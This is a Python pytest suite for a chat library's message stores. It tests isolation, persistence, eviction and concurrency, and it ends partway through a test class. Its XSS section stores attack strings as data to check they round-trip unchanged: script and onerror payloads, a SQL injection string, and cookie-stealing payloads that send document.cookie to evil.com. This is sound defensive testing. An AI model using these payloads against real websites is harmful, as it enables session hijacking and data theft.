"""End-to-end tests for chat: user isolation, history persistence, XSS prevention.

These tests verify real properties that matter in production:

1. Widget isolation — messages written to widget A cannot be read from widget B,
   even when both use the *same* backing store (MemoryChatStore or RedisChatStore).

2. History persistence across "refresh" — creating a fresh ChatManager that
   reuses an existing store sees all previously stored messages in the correct order.

3. XSS / injection prevention — malicious payloads (``<script>``, ``javascript:``
   URLs, ``onerror`` event handlers, null bytes, oversized content) are either:
   - **Rejected** by validators before reaching the store, OR
   - **Stored verbatim** (escaped strings, not executed HTML) so the store itself
     is not the injection vector.

4. Thread isolation — messages in thread-A are never surfaced when querying thread-B
   within the same widget.

5. Message-limit enforcement — stores cap thread history to
   MAX_MESSAGES_PER_THREAD; eviction happens from the front (oldest first).

6. Concurrent writers — two ChatManagers sharing the *same* store append
   messages from their respective widgets independently without crosstalk.

7. Cleanup — ``cleanup_widget`` removes only that widget's data, leaving
   other widgets intact.
"""

# pylint: disable=missing-function-docstring,redefined-outer-name,unused-argument

from __future__ import annotations

import asyncio
import time
import uuid

from typing import Any

import pytest

from pywry.chat import MAX_CONTENT_LENGTH, ChatMessage, ChatThread
from pywry.chat.manager import ChatManager
from pywry.state.memory import MemoryChatStore


# ---------------------------------------------------------------------------
# Helpers / fixtures shared across all test classes
# ---------------------------------------------------------------------------


def _make_thread(title: str = "Test Thread") -> ChatThread:
    return ChatThread(title=title)


def _make_message(role: str = "user", content: str = "hello") -> ChatMessage:
    return ChatMessage(role=role, content=content)  # type: ignore[arg-type]


def _make_widget_id() -> str:
    return f"widget_{uuid.uuid4().hex[:8]}"


def _make_thread_id() -> str:
    return f"thread_{uuid.uuid4().hex[:8]}"


@pytest.fixture
def memory_store() -> MemoryChatStore:
    """Fresh in-memory store for each test."""
    return MemoryChatStore()


@pytest.fixture
def redis_test_prefix() -> str:
    """Unique key prefix per test — prevents cross-test data pollution."""
    return f"chat_e2e:{uuid.uuid4().hex[:12]}"


@pytest.fixture
def redis_store(redis_container, redis_test_prefix):
    """RedisChatStore connected to a REAL Redis container.

    ``redis_container`` is the session-scoped fixture from conftest.py that
    spins up an actual Docker Redis container (or uses PYWRY_DEPLOY__REDIS_URL).
    Each test gets its own prefix so tests can run in parallel without
    stepping on each other's keys.
    """
    from pywry.state.redis import RedisChatStore

    return RedisChatStore(redis_url=redis_container, prefix=redis_test_prefix)


# ---------------------------------------------------------------------------
# Minimal chat widget mock (same style as the main test file)
# ---------------------------------------------------------------------------


class FakeWidget:
    """Captures all emitted (event_type, data) pairs."""

    def __init__(self) -> None:
        self.events: list[tuple[str, dict]] = []
        self._id = _make_widget_id()

    @property
    def widget_id(self) -> str:
        return self._id

    def emit(self, event_type: str, data: dict[str, Any]) -> None:
        self.events.append((event_type, data))

    def emit_fire(self, event_type: str, data: dict[str, Any]) -> None:
        self.events.append((event_type, data))

    def get_events(self, event_type: str) -> list[dict]:
        return [d for e, d in self.events if e == event_type]

    def last_event(self) -> tuple[str, dict] | None:
        return self.events[-1] if self.events else None

    def clear(self) -> None:
        self.events.clear()

    def all_assistant_texts(self) -> list[str]:
        return [d.get("text", "") for d in self.get_events("chat:assistant-message")]

    def all_chunk_texts(self) -> list[str]:
        return [d.get("text", "") for d in self.get_events("chat:chunk")]


@pytest.fixture(autouse=True)
def _disable_stream_buffering():
    """Disable async stream buffering so tests see results immediately."""
    orig_interval = ChatManager._STREAM_FLUSH_INTERVAL
    orig_max = ChatManager._STREAM_MAX_BUFFER
    ChatManager._STREAM_FLUSH_INTERVAL = 0
    ChatManager._STREAM_MAX_BUFFER = 1
    yield
    ChatManager._STREAM_FLUSH_INTERVAL = orig_interval
    ChatManager._STREAM_MAX_BUFFER = orig_max


def _wait_for_assistant(widget: FakeWidget, timeout: float = 5.0) -> None:
    """Block until a chat:assistant-message event arrives or timeout."""
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        if widget.get_events("chat:assistant-message"):
            return
        time.sleep(0.02)
    raise TimeoutError("assistant-message never arrived")


def _send_and_wait(mgr: ChatManager, widget: FakeWidget, text: str, timeout: float = 5.0) -> None:
    """Dispatch a user message and wait for the assistant reply."""
    widget.clear()
    # Simulate the IPC callback the frontend would fire
    active = mgr.active_thread_id
    mgr._on_user_message(
        {"text": text, "threadId": active},
        "chat:user-message",
        "chat:user-message",
    )
    _wait_for_assistant(widget, timeout=timeout)


# ===========================================================================
# 1. Widget isolation — MemoryChatStore
# ===========================================================================


class TestWidgetIsolationMemory:
    """Messages written to widget A must never appear for widget B."""

    @pytest.mark.asyncio
    async def test_different_widget_ids_isolated(self, memory_store: MemoryChatStore) -> None:
        """Separate widget IDs have completely separate namespaces."""
        wid_a = _make_widget_id()
        wid_b = _make_widget_id()
        tid = _make_thread_id()

        thread = _make_thread("Alice's thread")
        await memory_store.save_thread(wid_a, thread)
        await memory_store.append_message(
            wid_a, thread.thread_id, _make_message("user", "Alice's secret")
        )

        # Widget B has no data at all
        b_threads = await memory_store.list_threads(wid_b)
        assert b_threads == [], "Widget B must see no threads"

        # Widget B cannot retrieve Widget A's thread
        fetched = await memory_store.get_thread(wid_b, thread.thread_id)
        assert fetched is None, "Widget B must not access Widget A's thread"

        # Even if widget B queries with the same thread_id it must get nothing
        msgs = await memory_store.get_messages(wid_b, thread.thread_id)
        assert msgs == [], "Widget B must see no messages"

        # Suppress "local variable assigned but never used"
        _ = tid

    @pytest.mark.asyncio
    async def test_same_thread_id_different_widgets(self, memory_store: MemoryChatStore) -> None:
        """The same thread_id in two different widgets is fully independent."""
        wid_a = _make_widget_id()
        wid_b = _make_widget_id()
        shared_tid = _make_thread_id()

        thread_a = ChatThread(thread_id=shared_tid, title="A's view")
        thread_b = ChatThread(thread_id=shared_tid, title="B's view")

        await memory_store.save_thread(wid_a, thread_a)
        await memory_store.save_thread(wid_b, thread_b)
        await memory_store.append_message(wid_a, shared_tid, _make_message("user", "only for A"))
        await memory_store.append_message(wid_b, shared_tid, _make_message("user", "only for B"))

        msgs_a = await memory_store.get_messages(wid_a, shared_tid)
        msgs_b = await memory_store.get_messages(wid_b, shared_tid)

        texts_a = [m.text_content() for m in msgs_a]
        texts_b = [m.text_content() for m in msgs_b]

        assert "only for A" in texts_a
        assert "only for B" not in texts_a
        assert "only for B" in texts_b
        assert "only for A" not in texts_b

    @pytest.mark.asyncio
    async def test_cleanup_widget_leaves_others_intact(self, memory_store: MemoryChatStore) -> None:
        """cleanup_widget removes only one widget's data."""
        wid_a = _make_widget_id()
        wid_b = _make_widget_id()

        thread_a = _make_thread("A")
        thread_b = _make_thread("B")
        await memory_store.save_thread(wid_a, thread_a)
        await memory_store.save_thread(wid_b, thread_b)
        await memory_store.append_message(
            wid_a, thread_a.thread_id, _make_message("user", "msg from A")
        )
        await memory_store.append_message(
            wid_b, thread_b.thread_id, _make_message("user", "msg from B")
        )

        await memory_store.cleanup_widget(wid_a)

        # Widget A is gone
        assert await memory_store.list_threads(wid_a) == []
        # Widget B is untouched
        b_threads = await memory_store.list_threads(wid_b)
        assert len(b_threads) == 1
        b_msgs = await memory_store.get_messages(wid_b, thread_b.thread_id)
        assert len(b_msgs) == 1
        assert b_msgs[0].text_content() == "msg from B"


# ===========================================================================
# 2. Widget isolation — RedisChatStore (REAL Redis)
# ===========================================================================


@pytest.mark.redis
@pytest.mark.container
class TestWidgetIsolationRedis:
    """Same isolation guarantees verified against a REAL Redis container."""

    @pytest.mark.asyncio
    async def test_different_widget_ids_isolated(self, redis_store) -> None:
        wid_a = _make_widget_id()
        wid_b = _make_widget_id()

        thread = _make_thread("Redis thread A")
        await redis_store.save_thread(wid_a, thread)
        await redis_store.append_message(
            wid_a, thread.thread_id, _make_message("user", "redis secret")
        )

        b_threads = await redis_store.list_threads(wid_b)
        assert b_threads == []

        fetched = await redis_store.get_thread(wid_b, thread.thread_id)
        assert fetched is None

        msgs = await redis_store.get_messages(wid_b, thread.thread_id)
        assert msgs == []

    @pytest.mark.asyncio
    async def test_same_thread_id_different_widgets(self, redis_store) -> None:
        wid_a = _make_widget_id()
        wid_b = _make_widget_id()
        tid = _make_thread_id()

        ta = ChatThread(thread_id=tid, title="A")
        tb = ChatThread(thread_id=tid, title="B")

        await redis_store.save_thread(wid_a, ta)
        await redis_store.save_thread(wid_b, tb)
        await redis_store.append_message(wid_a, tid, _make_message("user", "A-private"))
        await redis_store.append_message(wid_b, tid, _make_message("user", "B-private"))

        msgs_a = await redis_store.get_messages(wid_a, tid)
        msgs_b = await redis_store.get_messages(wid_b, tid)

        texts_a = [m.text_content() for m in msgs_a]
        texts_b = [m.text_content() for m in msgs_b]

        assert "A-private" in texts_a and "B-private" not in texts_a
        assert "B-private" in texts_b and "A-private" not in texts_b

    @pytest.mark.asyncio
    async def test_delete_thread_only_touches_that_widget(self, redis_store) -> None:
        """Deleting a thread in one widget must not affect another widget's thread."""
        wid_a = _make_widget_id()
        wid_b = _make_widget_id()
        tid = _make_thread_id()

        # Both widgets have a thread with the same ID
        await redis_store.save_thread(wid_a, ChatThread(thread_id=tid, title="A"))
        await redis_store.save_thread(wid_b, ChatThread(thread_id=tid, title="B"))
        await redis_store.append_message(wid_a, tid, _make_message("user", "a msg"))
        await redis_store.append_message(wid_b, tid, _make_message("user", "b msg"))

        # Delete Widget A's thread
        deleted = await redis_store.delete_thread(wid_a, tid)
        assert deleted is True

        # Widget A's thread is gone
        assert await redis_store.get_thread(wid_a, tid) is None
        assert await redis_store.get_messages(wid_a, tid) == []

        # Widget B's thread is untouched
        bt = await redis_store.get_thread(wid_b, tid)
        assert bt is not None
        b_msgs = await redis_store.get_messages(wid_b, tid)
        assert len(b_msgs) == 1
        assert b_msgs[0].text_content() == "b msg"


# ===========================================================================
# 3. Message history persists across "refresh" (re-init same store)
# ===========================================================================


class TestHistoryPersistenceMemory:
    """Messages saved to a MemoryChatStore must survive a ChatManager re-init."""

    @pytest.mark.asyncio
    async def test_messages_survive_reinit(self, memory_store: MemoryChatStore) -> None:
        """Populating a store, then reading it from a new object returns the same data."""
        wid = _make_widget_id()
        thread = _make_thread("Persisted chat")
        await memory_store.save_thread(wid, thread)
        tid = thread.thread_id

        messages_to_store = [
            _make_message("user", "First question"),
            _make_message("assistant", "First answer"),
            _make_message("user", "Follow up question"),
            _make_message("assistant", "Follow up answer"),
        ]
        for msg in messages_to_store:
            await memory_store.append_message(wid, tid, msg)

        # Simulate a "refresh": list and retrieve without rebuilding store
        retrieved_thread = await memory_store.get_thread(wid, tid)
        assert retrieved_thread is not None

        retrieved_msgs = await memory_store.get_messages(wid, tid, limit=100)
        assert len(retrieved_msgs) == 4

        # Ordering must be preserved (oldest first)
        assert retrieved_msgs[0].text_content() == "First question"
        assert retrieved_msgs[1].text_content() == "First answer"
        assert retrieved_msgs[2].text_content() == "Follow up question"
        assert retrieved_msgs[3].text_content() == "Follow up answer"

    @pytest.mark.asyncio
    async def test_thread_titles_persist(self, memory_store: MemoryChatStore) -> None:
        """Thread titles are stored and retrievable."""
        wid = _make_widget_id()
        thread = _make_thread("My Important Conversation")
        await memory_store.save_thread(wid, thread)

        fetched = await memory_store.get_thread(wid, thread.thread_id)
        assert fetched is not None
        assert fetched.title == "My Important Conversation"

    @pytest.mark.asyncio
    async def test_multiple_threads_listed(self, memory_store: MemoryChatStore) -> None:
        """All saved threads appear in list_threads."""
        wid = _make_widget_id()
        threads = [_make_thread(f"Thread {i}") for i in range(5)]
        for t in threads:
            await memory_store.save_thread(wid, t)

        listed = await memory_store.list_threads(wid)
        assert len(listed) == 5
        listed_ids = {t.thread_id for t in listed}
        stored_ids = {t.thread_id for t in threads}
        assert listed_ids == stored_ids

    @pytest.mark.asyncio
    async def test_clear_messages_removes_history(self, memory_store: MemoryChatStore) -> None:
        """After clear_messages, the thread still exists but has no messages."""
        wid = _make_widget_id()
        thread = _make_thread()
        await memory_store.save_thread(wid, thread)
        await memory_store.append_message(wid, thread.thread_id, _make_message("user", "hello"))
        await memory_store.append_message(
            wid, thread.thread_id, _make_message("assistant", "world")
        )

        await memory_store.clear_messages(wid, thread.thread_id)

        msgs = await memory_store.get_messages(wid, thread.thread_id)
        assert msgs == [], "Messages must be empty after clear"

        # Thread itself still exists
        fetched = await memory_store.get_thread(wid, thread.thread_id)
        assert fetched is not None


# ===========================================================================
# 4. History persistence — RedisChatStore
# ===========================================================================


@pytest.mark.redis
@pytest.mark.container
class TestHistoryPersistenceRedis:
    """Same persistence guarantees verified against a REAL RedisChatStore."""

    @pytest.mark.asyncio
    async def test_messages_survive_reinit(self, redis_store) -> None:
        wid = _make_widget_id()
        thread = _make_thread("Redis persisted")
        await redis_store.save_thread(wid, thread)
        tid = thread.thread_id

        payloads = ["msg-one", "msg-two", "msg-three"]
        for p in payloads:
            await redis_store.append_message(wid, tid, _make_message("user", p))

        retrieved = await redis_store.get_messages(wid, tid, limit=100)
        assert len(retrieved) == 3
        assert [m.text_content() for m in retrieved] == payloads

    @pytest.mark.asyncio
    async def test_thread_metadata_round_trips(self, redis_store) -> None:
        wid = _make_widget_id()
        thread = ChatThread(title="Meta thread", metadata={"session_id": "abc123", "user": "alice"})
        await redis_store.save_thread(wid, thread)

        fetched = await redis_store.get_thread(wid, thread.thread_id)
        assert fetched is not None
        assert fetched.thread_id == thread.thread_id
        assert fetched.title == "Meta thread"
        assert fetched.metadata.get("session_id") == "abc123"
        assert fetched.metadata.get("user") == "alice"

    @pytest.mark.asyncio
    async def test_clear_messages_redis(self, redis_store) -> None:
        wid = _make_widget_id()
        thread = _make_thread()
        await redis_store.save_thread(wid, thread)
        await redis_store.append_message(wid, thread.thread_id, _make_message("user", "keep?"))
        await redis_store.append_message(wid, thread.thread_id, _make_message("assistant", "yes"))

        await redis_store.clear_messages(wid, thread.thread_id)

        msgs = await redis_store.get_messages(wid, thread.thread_id)
        assert msgs == []

    @pytest.mark.asyncio
    async def test_pagination_before_id(self, redis_store) -> None:
        """Messages before a cursor ID are returned, newest-last."""
        wid = _make_widget_id()
        thread = _make_thread()
        await redis_store.save_thread(wid, thread)
        msgs = [_make_message("user", f"msg-{i}") for i in range(10)]
        for m in msgs:
            await redis_store.append_message(wid, thread.thread_id, m)

        # Pagination: fetch everything before the 5th message
        pivot_id = msgs[4].message_id
        page = await redis_store.get_messages(wid, thread.thread_id, limit=100, before_id=pivot_id)
        assert len(page) == 4
        assert page[0].text_content() == "msg-0"
        assert page[-1].text_content() == "msg-3"


# ===========================================================================
# 5. Thread isolation — messages in thread A never appear in thread B
# ===========================================================================


class TestThreadIsolation:
    """Intra-widget thread isolation."""

    @pytest.mark.asyncio
    async def test_thread_a_messages_invisible_to_thread_b_memory(
        self, memory_store: MemoryChatStore
    ) -> None:
        wid = _make_widget_id()
        ta = _make_thread("Thread A")
        tb = _make_thread("Thread B")
        await memory_store.save_thread(wid, ta)
        await memory_store.save_thread(wid, tb)

        await memory_store.append_message(wid, ta.thread_id, _make_message("user", "only in A"))
        await memory_store.append_message(wid, tb.thread_id, _make_message("user", "only in B"))

        msgs_a = await memory_store.get_messages(wid, ta.thread_id)
        msgs_b = await memory_store.get_messages(wid, tb.thread_id)

        assert [m.text_content() for m in msgs_a] == ["only in A"]
        assert [m.text_content() for m in msgs_b] == ["only in B"]

    @pytest.mark.redis
    @pytest.mark.container
    @pytest.mark.asyncio
    async def test_thread_a_messages_invisible_to_thread_b_redis(self, redis_store) -> None:
        wid = _make_widget_id()
        ta = _make_thread("Redis Thread A")
        tb = _make_thread("Redis Thread B")
        await redis_store.save_thread(wid, ta)
        await redis_store.save_thread(wid, tb)

        await redis_store.append_message(wid, ta.thread_id, _make_message("user", "A-only"))
        await redis_store.append_message(wid, tb.thread_id, _make_message("user", "B-only"))

        msgs_a = await redis_store.get_messages(wid, ta.thread_id)
        msgs_b = await redis_store.get_messages(wid, tb.thread_id)

        assert [m.text_content() for m in msgs_a] == ["A-only"]
        assert [m.text_content() for m in msgs_b] == ["B-only"]

    @pytest.mark.asyncio
    async def test_delete_thread_a_leaves_thread_b_intact(
        self, memory_store: MemoryChatStore
    ) -> None:
        wid = _make_widget_id()
        ta = _make_thread("A")
        tb = _make_thread("B")
        await memory_store.save_thread(wid, ta)
        await memory_store.save_thread(wid, tb)
        await memory_store.append_message(wid, ta.thread_id, _make_message("user", "a"))
        await memory_store.append_message(wid, tb.thread_id, _make_message("user", "b"))

        deleted = await memory_store.delete_thread(wid, ta.thread_id)
        assert deleted is True

        remaining = await memory_store.list_threads(wid)
        assert len(remaining) == 1
        assert remaining[0].thread_id == tb.thread_id

        b_msgs = await memory_store.get_messages(wid, tb.thread_id)
        assert len(b_msgs) == 1


# ===========================================================================
# 6. XSS / injection prevention
# ===========================================================================


class TestXSSPrevention:
    """Verify XSS payloads are handled safely at the model validation layer.

    Approach:
    - ChatMessage validates content_length — oversized payloads are rejected.
    - The store layer stores whatever string it receives verbatim; the actual
      HTML escaping is done in the frontend renderer. We verify here that:
        a) The data layer does NOT corrupt or re-interpret the payload.
        b) Oversized payloads are rejected at the model layer.
        c) Null bytes and other exotic inputs do not cause crashes.
        d) The content round-trips through the store unchanged so the frontend
           always has the raw text (which it is responsible for escaping).
    """

    # --- Model-layer validation (ChatMessage) ---

    def test_oversized_content_rejected_at_model(self) -> None:
        """Content exceeding MAX_CONTENT_LENGTH must raise a validation error."""
        import pydantic

        oversized = "x" * (MAX_CONTENT_LENGTH + 1)
        with pytest.raises(pydantic.ValidationError, match="exceeds"):
            ChatMessage(role="user", content=oversized)

    def test_exactly_at_limit_accepted(self) -> None:
        """Content exactly at MAX_CONTENT_LENGTH is valid."""
        at_limit = "x" * MAX_CONTENT_LENGTH
        msg = ChatMessage(role="user", content=at_limit)
        assert len(msg.text_content()) == MAX_CONTENT_LENGTH

    @pytest.mark.parametrize(
        "payload",
        [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert(1)>",
            '<a href="javascript:alert(1)">click me</a>',
            "'; DROP TABLE messages; --",
            '{"admin": true, "role": "superuser"}',
            "</textarea><script>steal(document.cookie)</script>",
            "\x00null\x00bytes\x00",
            "<svg onload=alert(1)>",
            "%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
            "&#60;script&#62;alert(1)&#60;/script&#62;",
        ],
    )
    def test_xss_payload_stored_verbatim_not_executed(self, payload: str) -> None:
        """Payloads that fit within the size limit are stored *as-is*.

        The security contract: storing is not executing. The frontend renderer
        must HTML-escape these when injecting them into the DOM, but the store
        is NOT responsible for escaping. We verify the store does not mangle
        or silently drop content.
        """
        msg = ChatMessage(role="user", content=payload)
        # Round-trip the message via JSON (as both Redis and Memory stores do)
        restored = ChatMessage.model_validate_json(msg.model_dump_json())
        assert restored.text_content() == payload, (
            f"Store must preserve raw payload unchanged.\n"
            f"Input:  {payload!r}\n"
            f"Output: {restored.text_content()!r}"
        )

    @pytest.mark.asyncio
    async def test_xss_payload_round_trips_memory_store(
        self, memory_store: MemoryChatStore
    ) -> None:
        """A stored XSS payload is retrieved exactly as stored."""
        wid = _make_widget_id()
        payload = "<script>document.location='https://evil.com?c='+document.cookie</script>"

        thread = _make_thread()
        await memory_store.save_thread(wid, thread)
        msg = _make_message("user", payload)
        await memory_store.append_message(wid, thread.thread_id, msg)

        retrieved = await memory_store.get_messages(wid, thread.thread_id)
        assert len(retrieved) == 1
        assert retrieved[0].text_content() == payload

    @pytest.mark.redis
    @pytest.mark.container
    @pytest.mark.asyncio
    async def test_xss_payload_round_trips_redis_store(self, redis_store) -> None:
        """Same round-trip guarantee holds for RedisChatStore."""
        wid = _make_widget_id()
        payload = '<img src="x" onerror="fetch(\'https://evil.com?c=\'+btoa(document.cookie))">'

        thread = _make_thread()
        await redis_store.save_thread(wid, thread)
        msg = _make_message("user", payload)
        await redis_store.append_message(wid, thread.thread_id, msg)

        retrieved = await redis_store.get_messages(wid, thread.thread_id)
        assert len(retrieved) == 1
        assert retrieved[0].text_content() == payload

    @pytest.mark.asyncio
    async def test_null_bytes_round_trip(self, memory_store: MemoryChatStore) -> None:
        """Messages containing null bytes are stored and retrieved without truncation."""
        wid = _make_widget_id()
        payload = "before\x00after"

        thread = _make_thread()
        await memory_store.save_thread(wid, thread)
        await memory_store.append_message(wid, thread.thread_id, _make_message("user", payload))

        retrieved = await memory_store.get_messages(wid, thread.thread_id)
        assert retrieved[0].text_content() == payload

    def test_message_id_is_not_user_controlled(self) -> None:
        """message_id is auto-generated; a caller-supplied ID is accepted but
        should be treated as opaque and must not allow injection via the ID field."""
        # The model accepts a custom message_id but it is just a tag, not executed
        msg = ChatMessage(role="user", content="hello", message_id="<script>evil()</script>")
        # Round-trip: the ID must be stored as-is without execution
        restored = ChatMessage.model_validate_json(msg.model_dump_json())
        assert restored.message_id == "<script>evil()</script>"

    def test_user_cannot_escalate_role_via_payload(self) -> None:
        """Injecting 'system' role content via a user message does not grant
        system-level trust. The role field is validated by the model."""
        # This is a valid model construct — the *handler* is responsible for
        # checking roles. We verify the role is stored faithfully so there
        # is no magic coercion to a privileged role.
        msg = ChatMessage(role="user", content='{"role": "system", "override": true}')
        assert msg.role == "user"  # role field unchanged

    def test_oversized_metadata_does_not_crash(self) -> None:
        """Large metadata dicts are accepted (no size limit at model layer)."""
        big_meta = {f"key_{i}": f"value_{i}" for i in range(1000)}
        msg = ChatMessage(role="user", content="normal", metadata=big_meta)
        assert msg.metadata["key_999"] == "value_999"


# ===========================================================================
# 7. Message-limit enforcement (eviction)
# ===========================================================================


class TestMessageLimitEnforcement:
    """Stores must evict the oldest messages once MAX_MESSAGES_PER_THREAD
    is exceeded, keeping the most recent MAX_MESSAGES_PER_THREAD messages."""

    @pytest.mark.asyncio
    async def test_eviction_memory_store(self, memory_store: MemoryChatStore) -> None:
        """MemoryChatStore evicts oldest messages when the cap is reached."""
        wid = _make_widget_id()
        thread = _make_thread()
        await memory_store.save_thread(wid, thread)

        # We don't actually insert 1000+ messages in a unit test — instead we
        # patch the limit to a small value for this assertion.
        import pywry.chat as chat_module
        import pywry.state.memory as mem_module

        original_limit = chat_module.MAX_MESSAGES_PER_THREAD
        chat_module.MAX_MESSAGES_PER_THREAD = 5
        mem_module.MAX_MESSAGES_PER_THREAD = 5  # type: ignore[attr-defined]
        try:
            for i in range(8):
                await memory_store.append_message(
                    wid, thread.thread_id, _make_message("user", f"msg-{i}")
                )
            msgs = await memory_store.get_messages(wid, thread.thread_id, limit=100)
            assert len(msgs) <= 5, "Must not exceed the cap"
            # The OLDEST messages were evicted; newest are kept
            texts = [m.text_content() for m in msgs]
            assert "msg-7" in texts, "Most recent message must be present"
            assert "msg-0" not in texts, "Oldest message must have been evicted"
        finally:
            chat_module.MAX_MESSAGES_PER_THREAD = original_limit
            mem_module.MAX_MESSAGES_PER_THREAD = original_limit  # type: ignore[attr-defined]

    @pytest.mark.redis
    @pytest.mark.container
    @pytest.mark.asyncio
    async def test_eviction_redis_store(self, redis_store) -> None:
        """RedisChatStore evicts oldest messages when the cap is reached."""
        import pywry.chat as chat_module

        original_limit = chat_module.MAX_MESSAGES_PER_THREAD
        chat_module.MAX_MESSAGES_PER_THREAD = 5

        try:
            wid = _make_widget_id()
            thread = _make_thread()
            await redis_store.save_thread(wid, thread)

            for i in range(8):
                await redis_store.append_message(
                    wid, thread.thread_id, _make_message("user", f"redis-msg-{i}")
                )

            msgs = await redis_store.get_messages(wid, thread.thread_id, limit=100)
            assert len(msgs) <= 5
            texts = [m.text_content() for m in msgs]
            assert "redis-msg-7" in texts
            assert "redis-msg-0" not in texts
        finally:
            chat_module.MAX_MESSAGES_PER_THREAD = original_limit


# ===========================================================================
# 8. Concurrent writers — two ChatManagers share same store
# ===========================================================================


class TestConcurrentWritersMemory:
    """Two ChatManagers sharing a MemoryChatStore must not collide."""

    @pytest.mark.asyncio
    async def test_two_writers_independent_threads(self, memory_store: MemoryChatStore) -> None:
        """Two coroutines writing to different widget IDs concurrently don't interfere."""
        wid_a = _make_widget_id()
        wid_b = _make_widget_id()

        ta = _make_thread("A")
        tb = _make_thread("B")
        await memory_store.save_thread(wid_a, ta)
        await memory_store.save_thread(wid_b, tb)

        async def write_a() -> None:
            for i in range(20):
                await memory_store.append_message(
                    wid_a, ta.thread_id, _make_message("user", f"a-{i}")
                )

        async def write_b() -> None:
            for i in range(20):
                await memory_store.append_message(
                    wid_b, tb.thread_id, _make_message("user", f"b-{i}")
                )

        await asyncio.gather(write_a(), write_b())

        msgs_a = await memory_store.get_messages(wid_a, ta.thread_id, limit=100)
        msgs_b = await memory_store.get_messages(wid_b, tb.thread_id, limit=100)

        assert len(msgs_a) == 20
        assert len(msgs_b) == 20

        # No cross-contamination
        texts_a = {m.text_content() for m in msgs_a}
        texts_b = {m.text_content() for m in msgs_b}
        assert not (texts_a & texts_b), "Widget stores must not share any messages"

    @pytest.mark.asyncio
    async def test_two_writers_same_widget_different_threads(
        self, memory_store: MemoryChatStore
    ) -> None:
        """Two writers on the same widget but different threads stay isolated."""
        wid = _make_widget_id()
        ta = _make_thread("A")
        tb = _make_thread("B")
        await memory_store.save_thread(wid, ta)
        await memory_store.save_thread(wid, tb)

        async def write(thread: ChatThread, label: str) -> None:
            for i in range(10):
                await memory_store.append_message(
                    wid, thread.thread_id, _make_message("user", f"{label}-{i}")
                )

        await asyncio.gather(write(ta, "T1"), write(tb, "T2"))

        msgs_a = await memory_store.get_messages(wid, ta.thread_id, limit=100)
        msgs_b = await memory_store.get_messages(wid, tb.thread_id, limit=100)

        assert len(msgs_a) == 10
        assert len(msgs_b) == 10
        for m in msgs_a:
            assert m.text_content().startswith("T1-")
        for m in msgs_b:
            assert m.text_content().startswith("T2-")


# ===========================================================================
# 9. ChatManager end-to-end with backing store
# ===========================================================================


class TestChatManagerWithStore:
    """ChatManager integrated with a real MemoryChatStore.

    These tests exercise the full pipeline: receiving a user message,
    running the handler, appending the assistant reply, and verifying
    what the *store* received — not just what was emitted.
    """

    def _make_manager_with_store(self, store: MemoryChatStore, widget: FakeWidget) -> ChatManager:
        def echo(messages, ctx):
            return f"Echo: {messages[-1]['text']}"

        mgr = ChatManager(handler=echo)
        mgr.bind(widget)
        return mgr

    def test_user_message_stored_in_manager_threads(self) -> None:
        """After a user message, the manager's in-memory threads dict contains it."""
        widget = FakeWidget()
        store = MemoryChatStore()
        mgr = self._make_manager_with_store(store, widget)

        _send_and_wait(mgr, widget, "Hello store!")

        active = mgr.active_thread_id
        thread_msgs = mgr.threads.get(active, [])
        user_msgs = [m for m in thread_msgs if m.get("role") == "user"]
        assert any("Hello store!" in m.get("text", "") for m in user_msgs)

    def test_assistant_reply_stored_in_manager_threads(self) -> None:
        """After the handler replies, the manager's threads contain the assistant message."""
        widget = FakeWidget()
        store = MemoryChatStore()
        mgr = self._make_manager_with_store(store, widget)

        _send_and_wait(mgr, widget, "ping")

        active = mgr.active_thread_id
        thread_msgs = mgr.threads.get(active, [])
        assistant_msgs = [m for m in thread_msgs if m.get("role") == "assistant"]
        assert any("Echo: ping" in m.get("text", "") for m in assistant_msgs)

    def test_two_managers_different_widgets_no_crosstalk(self) -> None:
        """Messages from widget-A's ChatManager do not appear in widget-B's."""
        widget_a = FakeWidget()
        widget_b = FakeWidget()
        store = MemoryChatStore()

        mgr_a = self._make_manager_with_store(store, widget_a)
        mgr_b = self._make_manager_with_store(store, widget_b)

        _send_and_wait(mgr_a, widget_a, "secret from A")
        _send_and_wait(mgr_b, widget_b, "message from B")

        # Manager A's thread must not contain B's message
        tid_a = mgr_a.active_thread_id
        tid_b = mgr_b.active_thread_id

        # Thread IDs are auto-generated and distinct
        assert tid_a != tid_b

        texts_a = {m.get("text", "") for m in mgr_a.threads.get(tid_a, [])}
        texts_b = {m.get("text", "") for m in mgr_b.threads.get(tid_b, [])}

        assert "secret from A" in texts_a
        assert "message from B" not in texts_a
        assert "message from B" in texts_b
        assert "secret from A" not in texts_b

    def test_thread_switch_restores_history(self) -> None:
        """Switching threads re-emits that thread's message history."""
        widget = FakeWidget()
        store = MemoryChatStore()
        mgr = self._make_manager_with_store(store, widget)

        # Send a message to the default thread
        _send_and_wait(mgr, widget, "in thread one")
        thread_one_id = mgr.active_thread_id

        # Create a second thread
        widget.clear()
        mgr._on_thread_create({"title": "Thread Two"}, *[""] * 2)
        thread_two_id = mgr.active_thread_id
        assert thread_two_id != thread_one_id

        # Send a message to thread two
        _send_and_wait(mgr, widget, "in thread two")

        # Now switch back to thread one; assistant-message events for thread one must fire
        widget.clear()
        mgr._on_thread_switch({"threadId": thread_one_id}, *[""] * 2)

        assistant_events = widget.get_events("chat:assistant-message")
        emitted_texts = [e.get("text", "") for e in assistant_events]
        # thread one's messages (user + echo) should have been re-emitted
        assert any("in thread one" in t or "Echo: in thread one" in t for t in emitted_texts)

    def test_slash_clear_empties_thread(self) -> None:
        """The /clear slash command must wipe the active thread's history."""
        widget = FakeWidget()
        store = MemoryChatStore()
        mgr = self._make_manager_with_store(store, widget)

        _send_and_wait(mgr, widget, "first message")
        _send_and_wait(mgr, widget, "second message")

        active = mgr.active_thread_id
        assert len(mgr.threads.get(active, [])) >= 2

        # Trigger the slash command
        mgr._on_slash_command_event({"command": "/clear"}, *[""] * 2)

        assert mgr.threads.get(active, []) == [], "History must be empty after /clear"


# ===========================================================================
# 10. Immutability of cross-widget data in ChatManager event flow
# ===========================================================================


class TestEventIsolation:
    """Verify that events fired for one widget cannot be received by another."""

    def test_two_widgets_receive_only_own_events(self) -> None:
        """Each widget only receives events emitted by its own ChatManager."""
        widget_a = FakeWidget()
        widget_b = FakeWidget()

        def handler_a(messages, ctx):
            return "response-A"

        def handler_b(messages, ctx):
            return "response-B"

        mgr_a = ChatManager(handler=handler_a)
        mgr_a.bind(widget_a)

        mgr_b = ChatManager(handler=handler_b)
        mgr_b.bind(widget_b)

